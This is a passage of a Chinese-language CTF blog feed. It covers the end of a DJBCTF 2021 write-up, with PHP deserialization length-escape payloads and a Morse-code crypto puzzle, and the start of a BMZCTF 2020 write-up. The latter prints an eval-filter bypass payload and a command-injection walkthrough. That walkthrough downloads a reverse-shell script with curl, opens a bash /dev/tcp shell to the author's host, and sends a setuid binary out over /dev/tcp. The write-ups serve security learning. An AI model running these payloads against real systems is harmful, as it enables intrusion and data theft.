operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>标准反序列化长度逃逸，可惜非预期了</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>看<code>spaceman</code>类，两个变量由魔术方法<code>__construct</code>赋值，<code>filter</code>函数替换字符串，基本上就确定本题是反序列化长度逃逸了。</p><p>同样，<code>php://input</code>读取原始流数据变量覆盖，绕过方法同web1，构造反序列化</p><p><code>str_replace</code>将<code>ctfshowup</code>替换为<code>ctfshow</code>，也就是说原来9个字符变成了7个字符，有两个字符逃逸了。</p><p>我们的核心目标是将<code>password</code>覆盖为<code>ctfshowvip</code>，所以最后部分的序列化字符串应为<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>，一共35个字符。</p><p>所以它原始生成的部分应该被覆盖的为<code>&quot;;s:8:&quot;password&quot;;s:35:</code>即22个字符，所以<code>username</code>应该填入11个<code>ctfshowup</code>来覆盖它</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token double-quoted-string string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token double-quoted-string string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>最终payload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>记得空格绕<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844" loading="lazy"><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>由于变量覆盖，直接覆盖<code>pass_word</code>即可</p><p>payload：<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341" loading="lazy"><h4 id="题目思考-1"><a href="#题目思考-1" class="headerlink" title="题目思考"></a>题目思考</h4><p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong> </p><p>漏洞影响版本：</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>经典的反序列化长度逃逸的题目了</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="大佬们帮我看看我这个Python脚本为什么运行不了啊"><a href="#大佬们帮我看看我这个Python脚本为什么运行不了啊" class="headerlink" title="大佬们帮我看看我这个Python脚本为什么运行不了啊"></a>大佬们帮我看看我这个Python脚本为什么运行不了啊</h3><p>题目描述</p><pre class="language-none"><code class="language-none">菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py菜鸡 9:37:02key1: Do you want a DaJiBei?菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">为什么运行结果里好好的3，也要写成大小写混乱的样子？</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">如果某个方向已经找不到更多的线索，不妨回头看看来时的道路</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？ 为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png" loading="lazy"><p>最终提示hint5直接点明摩斯密码</p><p>题目原件</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>《关于我的老师看到直接气死过去怎么办》</p><p>根据题目描述，把<code>key1</code>替换为<code>Do you want a DaJiBei?</code></p><p>调整好格式跑一遍，得到<code>thrEE_means_3</code>，尝试各种单表加密均无果，根据hint4，对原始文件进行尝试还是无果，最后比赛快结束了，放出直接提示hint5，尝试将全篇小写转换为<code>.</code>，大写转换为<code>-</code>解密，发现摩斯密码表并不是固定位数，怕是要爆破排列组合，放弃了。</p><p>赛后出题人 @cheyenne 指点，本题摩斯密码统一采用五位一组，由总数为245位可得。</p><p>由于本人python正在自学水平一般，套用之前写过的一套C的替换程序</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ： 2021/1/24 13:58@Auth ： gyy@Blog ：http://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>浓浓的菜鸡味~，跑出结果</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>拿去解密得</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>看到ascii码<code> 102 108 97 103</code>立马起了反应，这是<code>flag</code>的ascii码，所以是每两个或三个组合成一个字符</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>最后得到flag：<code>flag&#123;SEVen_means_8&#125;</code></p><p>无限接近答案，但密码学爷爷太强了呜呜呜</p><hr><p>有些收获吧，如有问题希望大佬们斧正。2021一起学习。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021第一场比赛&lt;/p&gt;
&lt;p&gt;昵称：别答了别答了再答人傻了&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2021</title>
    <link href="https://err0r.top/article/2021/"/>
    <id>https://err0r.top/article/2021/</id>
    <published>2020-12-31T16:00:00.000Z</published>
    <updated>2021-03-19T05:34:57.780Z</updated>
    
    <content type="html"><![CDATA[<p align="center">展望2021</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p align=&quot;center&quot;&gt;展望2021&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>2020BMZctf-Writeup</title>
    <link href="https://err0r.top/article/bmzctf2020/"/>
    <id>https://err0r.top/article/bmzctf2020/</id>
    <published>2020-12-28T12:47:11.000Z</published>
    <updated>2021-03-30T11:49:45.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020BMZCTF-Write-up"><a href="#2020BMZCTF-Write-up" class="headerlink" title="2020BMZCTF Write-up"></a>2020BMZCTF Write-up</h2><p>随缘做了两道web</p><p>昵称：Err0r</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-ezeval"><a href="#WEB-ezeval" class="headerlink" title="WEB_ezeval"></a>WEB_ezeval</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'echo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'`'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'preg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'server'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'chr'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'html'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'md5'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'post'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'get'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'session'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ascii'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'eval'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'replace'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'exec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cookie'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'$'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'include'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'print'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'scan'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'decode'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'system'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ini_'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'passthru'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'pcntl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'open'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'log'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'current'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'local'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'require'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"BMZCTF"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，但肯定还有能用的，<code>&lt;、&gt;、&quot;</code>因为<code>htmlspecialchars</code>也是不能用的</p><p>往无参数RCE方向走发现不太可行，最后利用<code>base_convert</code>构造语句</p><p>把<code>system</code>由base36转为base10，利用<code>base_convert(2146934604002,10,36)</code>发现可以执行系统命令，于是想读取根目录flag发现<code>/</code>传不进去，于是继续<code>base_convert(16191,10,36)</code>，利用<code>chr</code>函数转换<code>/</code>，最终读取flag</p><p>payload：<code>cmd=base_convert(2146934604002,10,36)(base_convert(16191,10,36)(47).flag);</code></p><img src="/article/bmzctf2020/image-20201228205633315.png" class="" title="image-20201228205633315" loading="lazy"><hr><h4 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h4><p>主要考察反弹shell，提权</p><p>打开得源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'d'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'e'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'q'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'g'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'+'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'k'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'m'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&lt;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\>'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'o'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\~'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\:'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\^'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\@'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&amp;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\%'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\"'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\*'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\('</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\)'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\!'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\='</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\.'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\['</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\]'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#125;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\&#123;'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match <span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blacklisted</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>命令执行，<code>ip</code>经过blacklist过滤后exec执行，但是测着发现foreach会每次取一位然后来执行，执行多次，也就是说只要不含<code>b</code>就可以执行，这里可以直接执行，但限制了18个字符的长度限制发挥，尝试反弹shell，明显反弹shell第一个单词<code>bash</code>会被过滤，另寻方法。</p><p>首先就执行<code>find / -name fl*&gt;1</code>，执行后输出结果到文件1，结果发现根本就没有flag！</p><p>测试echo可写，于是准备写个一句话木马，结果发现写的.php不执行，应该是写了规则。</p><p>于是准备写个<code>.htaccess</code>，结果一写直接500内部服务报错。</p><p>老实弹shell吧。</p><p>想直接写<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code>，结果发现<code>&amp;</code>写不进去，测试发现靶机可连外网，于是在自己服务器上写个名为1的文件，内容为<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code></p><p>再在靶机写个文件<code>1d</code>，内容为<code>curl ip/1&gt;1</code></p><p>运行<code>sh 1d</code>，发现不行，估计没有执行权限，赋予，<code>chmod 777 1d</code>，靶机运行了curl命令，访问我的服务器下载了文件1，这样就成功写了反弹shell的命令</p><p>在我的服务器监听端口，<code>nc -lvp [port]</code></p><p>再给1赋予执行权限<code>chmod 777 1</code>，需要用bash执行，可是不可以含有<code>b</code>，于是利用<code>?</code>和<code>[a-c]</code>，即执行<code>/?in/[a-c]ash 1</code></p><p>我的服务器成功getshell</p><img src="/article/bmzctf2020/image-20201228211635023.png" class="" title="image-20201228211635023" loading="lazy"><p>根目录下没有发现flag，也没有readflag，找也找不到flag，有个<code>start.sh</code>，读取一下看看</p><pre class="language-sh" data-language="sh"><code class="language-sh">www-data@2a4c1fe2f663:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;start.shcat &#x2F;start.sh#!&#x2F;bin&#x2F;bash chmod 755 index.phpgcc &#x2F;root&#x2F;demo.c -o lovemv love &#x2F;usr&#x2F;bin&#x2F;lovechmod u+s &#x2F;usr&#x2F;bin&#x2F;loverm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logrm &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</code></pre><p>关键在这个<code>/user/bin/love</code></p><p>读出来看看，服务器开监听端口，靶机shell执行<code>cat /usr/bin/love &gt; /dev/tcp/[ip]/[port]</code></p><img src="/article/bmzctf2020/image-20201228212753119.png" class="" title="image-20201228212753119" loading="lazy"><p>成功拿到文件，拷下来反编译一下(web狗汗颜)</p><img src="/article/bmzctf2020/image-20201228212718787.png" class="" title="image-20201228212718787" 